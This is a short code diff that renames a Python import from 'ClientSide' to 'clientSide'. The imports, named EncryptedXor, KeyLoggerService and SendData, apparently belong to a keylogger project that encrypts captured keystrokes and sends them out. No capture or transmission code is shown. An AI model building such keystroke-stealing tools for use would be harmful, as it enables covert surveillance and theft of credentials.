@@ -1,6 +1,6 @@
 from EncryptedXor import EncryptedXor
 from KeyLoggerService import KeyLoggerService
-from ClientSide import SendData
+from clientSide import SendData
 from datetime import datetime
 import time
 
